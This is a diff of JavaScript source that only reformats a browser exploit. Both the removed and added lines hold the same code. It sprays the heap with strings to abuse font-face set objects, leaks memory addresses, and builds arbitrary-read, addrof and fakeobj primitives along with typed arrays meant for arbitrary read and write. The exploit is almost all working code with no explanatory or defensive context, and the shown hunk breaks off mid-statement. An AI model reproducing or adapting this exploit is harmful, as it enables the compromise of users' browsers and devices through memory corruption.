@@ -31,220 +31,164 @@ c: true};
 var string_atomifier = {};
 var string_id = 10000000;
 function ptrToString(p) {
-        var s = '';
-        for (var i = 0; i < 8; i++) {
-            s += String.fromCharCode(p % 256);
-            p = (p - p % 256) / 256;
-        }
-        return s;
-    }
-
-    function stringToPtr(p, o) {
-        if (o === undefined)
-            o = 0;
-        var ans = 0;
-        for (var i = 7; i >= 0; i--)
-            ans = 256 * ans + p.charCodeAt(o + i);
-        return ans;
-    }
-
-    var strings = [];
-
-    function mkString(l, head) {
-        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
-        string_atomifier[s] = 1;
-        strings.push(s);
-        return s;
-    }
-
-    var guf = GUESS_FONT;
-    var ite = true;
-    var matches = 0;
-
-    var round = 0;
-
-    window.ffses = {};
-
-    do {
-		
-        var p_s = ptrToString(NPAGES + 2);
-        for (var i = 0; i < NPAGES; i++)
-            p_s += ptrToString(guf + i * PAGE_SIZE);
-        p_s += ptrToString(INVALID_POINTER);
-
-        for (var i = 0; i < 256; i++)
-            mkString(HASHMAP_BUCKET, p_s);
-
-        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
-
-        var badstr1 = mkString(HASHMAP_BUCKET, p_s);
-
-        var guessed_font = null;
-        var guessed_addr = null;
-
-        for (var i = 0; i < SPRAY_FONTS; i++) {
-            bad_fonts[i].family = "search" + round;
-            if (badstr1.substr(0, p_s.length) != p_s) {
-                guessed_font = i;
-                var p_s1 = badstr1.substr(0, p_s.length);
-                for (var i = 1; i <= NPAGES; i++) {
-                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
-                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
-                        break;
-                    }
-                }
-                if (matches++ == 0) {
-                    guf = guessed_addr + 2 * PAGE_SIZE;
-                    guessed_addr = null;
-                }
-                break;
-            }
-        }
-
-        if ((ite = !ite))
-            guf += NPAGES * PAGE_SIZE;
-
-    }
-    while (guessed_addr === null);
-    var p_s = '';
-    p_s += ptrToString(26);
-    p_s += ptrToString(guessed_addr);
-    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
-    for (var i = 0; i < 19; i++)
-        p_s += ptrToString(INVALID_POINTER);
-
-    for (var i = 0; i < 256; i++)
-        mkString(HASHMAP_BUCKET, p_s);
-
-    var needfix = [];
-    for (var i = 0;; i++) {
-        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
-        var badstr2 = mkString(HASHMAP_BUCKET, p_s);
-        needfix.push(mkString(HASHMAP_BUCKET, p_s));
-        bad_fonts[guessed_font].family = "evil2";
-        bad_fonts[guessed_font + 1].family = "evil3";
-        var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
-        if (leak < 0x1000000000000)
-            break;
-    }
-
-    function makeReader(read_addr, ffs_name) {
-        var fake_s = '';
-        fake_s += '0000';
-        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
-        fake_s += ptrToString(read_addr);
-        fake_s += ptrToString(0x80000014);
-        p_s = '';
-        p_s += ptrToString(29);
-        p_s += ptrToString(guessed_addr);
-        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
-        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
-        for (var i = 0; i < 18; i++)
-            p_s += ptrToString(INVALID_POINTER);
-        for (var i = 0; i < 256; i++)
-            mkString(HASHMAP_BUCKET, p_s);
-        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
-        mkString(HASHMAP_BUCKET, p_s);
-        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
-        bad_fonts[guessed_font].family = ffs_name + "_evil1";
-        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
-        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
-        needfix.push(relative_read);
-        if (relative_read.length < 1000)
-            return makeReader(read_addr, ffs_name + '_');
-        return relative_read;
-    }
-
-    var fastmalloc = makeReader(leak, 'ffs3');
-
-    for (var i = 0; i < 100000; i++)
-        mkString(128, '');
-
-    var props = [];
-    for (var i = 0; i < 0x10000; i++) {
-        props.push({
-            value: 0x41434442
-        });
-        props.push({
-            value: jsvalue
-        });
-    }
-
-    var jsvalue_leak = null;
-	Object.defineProperties({}, props);
-	var index = fastmalloc.search(eval("String.fromCharCode(0x42,0x44,0x43,0x41,0,0,254,255)")+"................"+eval("String.fromCharCode(14)"));
-	jsvalue_leak = stringToPtr(fastmalloc, index + 32);
-
-    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
-    var array256 = stringToPtr(rd_leak, 16);
-    var ui32a = stringToPtr(rd_leak, 24);
-
-    var rd_arr = makeReader(array256, 'ffs5');
-    var butterfly = stringToPtr(rd_arr, 8);
-
-    var rd_ui32 = makeReader(ui32a, 'ffs6');
-    for (var i = 0; i < 8; i++)
-        union_b[i] = rd_ui32.charCodeAt(i);
-
-    var structureid_low = union_i[0];
-    var structureid_high = union_i[1];
-
-    union_i[0] = 0x10000;
-    union_i[1] = 0;
-    arrays[257][1] = {};
-    arrays[257][0] = union_f[0];
-    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
-    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
-    arrays[256][i] = union_f[0];
-
-    //hammer time!
-
-    pp_s = '';
-    pp_s += ptrToString(56);
-    for (var i = 0; i < 12; i++)
-        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
-
-    var fake_s = '';
-    fake_s += '0000';
-    fake_s += ptrToString(INVALID_POINTER);
-    fake_s += ptrToString(butterfly);
-    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
-
-    var ffs7_args = [];
-    for (var i = 0; i < 12; i++)
-        ffs7_args.push(bad_fonts[guessed_font + i]);
-    ffs7_args.push(good_font);
-
-    var ffs8_args = [bad_fonts[guessed_font + 12]];
-    for (var i = 0; i < 5; i++)
-        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
-
-    for (var i = 0; i < HAMMER_NSTRINGS; i++)
-        mkString(HASHMAP_BUCKET, pp_s);
-
-    ffses.ffs7 = new FontFaceSet(ffs7_args);
-    mkString(HASHMAP_BUCKET, pp_s);
-    ffses.ffs8 = new FontFaceSet(ffs8_args);
-    var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
-    needfix.push(post_ffs);
-
-    for (var i = 0; i < 13; i++)
-        bad_fonts[guessed_font + i].family = "hammer" + i;
-
-    function boot_addrof(obj) {
-        arrays[257][32] = obj;
-        union_f[0] = arrays[258][0];
-        return union_i[1] * 0x100000000 + union_i[0];
-    }
-
-    function boot_fakeobj(addr) {
-        union_i[0] = addr;
-        union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
-        arrays[258][0] = union_f[0];
-        return arrays[257][32];
-    }
-
-    var arw_master = new Uint32Array(8);
+var s = '';
+for (var i = 0; i < 8; i++) {
+s += String.fromCharCode(p % 256);
+p = (p - p % 256) / 256;}
+return s;}
+function stringToPtr(p, o) {
+if (o === undefined)
+o = 0;
+var ans = 0;
+for (var i = 7; i >= 0; i--)
+ans = 256 * ans + p.charCodeAt(o + i);
+return ans;}
+var strings = [];
+function mkString(l, head) {
+var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
+string_atomifier[s] = 1;
+strings.push(s);
+return s;}
+var guf = GUESS_FONT;
+var ite = true;
+var matches = 0;
+var round = 0;
+window.ffses = {};
+do {
+var p_s = ptrToString(NPAGES + 2);
+for (var i = 0; i < NPAGES; i++)
+p_s += ptrToString(guf + i * PAGE_SIZE);
+p_s += ptrToString(INVALID_POINTER);
+for (var i = 0; i < 256; i++)
+mkString(HASHMAP_BUCKET, p_s);
+var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
+var badstr1 = mkString(HASHMAP_BUCKET, p_s);
+var guessed_font = null;
+var guessed_addr = null;
+for (var i = 0; i < SPRAY_FONTS; i++) {
+bad_fonts[i].family = "search" + round;
+if (badstr1.substr(0, p_s.length) != p_s) {
+guessed_font = i;
+var p_s1 = badstr1.substr(0, p_s.length);
+for (var i = 1; i <= NPAGES; i++) {
+if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
+guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
+break;}}
+if (matches++ == 0) {
+guf = guessed_addr + 2 * PAGE_SIZE;
+guessed_addr = null;}
+break;}}
+if ((ite = !ite))
+guf += NPAGES * PAGE_SIZE;}
+while (guessed_addr === null);
+var p_s = '';
+p_s += ptrToString(26);
+p_s += ptrToString(guessed_addr);
+p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+for (var i = 0; i < 19; i++)
+p_s += ptrToString(INVALID_POINTER);
+for (var i = 0; i < 256; i++)
+mkString(HASHMAP_BUCKET, p_s);
+var needfix = [];
+for (var i = 0;; i++) {
+ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
+var badstr2 = mkString(HASHMAP_BUCKET, p_s);
+needfix.push(mkString(HASHMAP_BUCKET, p_s));
+bad_fonts[guessed_font].family = "evil2";
+bad_fonts[guessed_font + 1].family = "evil3";
+var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
+if (leak < 0x1000000000000)
+break;}
+function makeReader(read_addr, ffs_name) {
+var fake_s = '';
+fake_s += '0000';
+fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
+fake_s += ptrToString(read_addr);
+fake_s += ptrToString(0x80000014);
+p_s = '';
+p_s += ptrToString(29);
+p_s += ptrToString(guessed_addr);
+p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
+for (var i = 0; i < 18; i++)
+p_s += ptrToString(INVALID_POINTER);
+for (var i = 0; i < 256; i++)
+mkString(HASHMAP_BUCKET, p_s);
+var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
+mkString(HASHMAP_BUCKET, p_s);
+var relative_read = mkString(HASHMAP_BUCKET, fake_s);
+bad_fonts[guessed_font].family = ffs_name + "_evil1";
+bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
+bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
+needfix.push(relative_read);
+if (relative_read.length < 1000)
+return makeReader(read_addr, ffs_name + '_');
+return relative_read;}
+var fastmalloc = makeReader(leak, 'ffs3');
+for (var i = 0; i < 100000; i++)
+mkString(128, '');
+var props = [];
+for (var i = 0; i < 0x10000; i++) {
+props.push({
+value: 0x41434442});
+props.push({
+value: jsvalue});}
+var jsvalue_leak = null;
+Object.defineProperties({}, props);
+var index = fastmalloc.search(eval("String.fromCharCode(0x42,0x44,0x43,0x41,0,0,254,255)")+"................"+eval("String.fromCharCode(14)"));
+jsvalue_leak = stringToPtr(fastmalloc, index + 32);
+var rd_leak = makeReader(jsvalue_leak, 'ffs4');
+var array256 = stringToPtr(rd_leak, 16);
+var ui32a = stringToPtr(rd_leak, 24);
+var rd_arr = makeReader(array256, 'ffs5');
+var butterfly = stringToPtr(rd_arr, 8);
+var rd_ui32 = makeReader(ui32a, 'ffs6');
+for (var i = 0; i < 8; i++)
+union_b[i] = rd_ui32.charCodeAt(i);
+var structureid_low = union_i[0];
+var structureid_high = union_i[1];
+union_i[0] = 0x10000;
+union_i[1] = 0;
+arrays[257][1] = {};
+arrays[257][0] = union_f[0];
+union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
+union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
+arrays[256][i] = union_f[0];
+pp_s = '';
+pp_s += ptrToString(56);
+for (var i = 0; i < 12; i++)
+pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
+var fake_s = '';
+fake_s += '0000';
+fake_s += ptrToString(INVALID_POINTER);
+fake_s += ptrToString(butterfly);
+fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
+var ffs7_args = [];
+for (var i = 0; i < 12; i++)
+ffs7_args.push(bad_fonts[guessed_font + i]);
+ffs7_args.push(good_font);
+var ffs8_args = [bad_fonts[guessed_font + 12]];
+for (var i = 0; i < 5; i++)
+ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
+for (var i = 0; i < HAMMER_NSTRINGS; i++)
+mkString(HASHMAP_BUCKET, pp_s);
+ffses.ffs7 = new FontFaceSet(ffs7_args);
+mkString(HASHMAP_BUCKET, pp_s);
+ffses.ffs8 = new FontFaceSet(ffs8_args);
+var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
+needfix.push(post_ffs);
+for (var i = 0; i < 13; i++)
+bad_fonts[guessed_font + i].family = "hammer" + i;
+function boot_addrof(obj) {
+arrays[257][32] = obj;
+union_f[0] = arrays[258][0];
+return union_i[1] * 0x100000000 + union_i[0];}
+function boot_fakeobj(addr) {
+union_i[0] = addr;
+union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
+arrays[258][0] = union_f[0];
+return arrays[257][32];}
+var arw_master = new Uint32Array(8);
     var arw_slave = new Uint8Array(1);
     var obj_master = new Uint32Array(8);
     var obj_slave = {
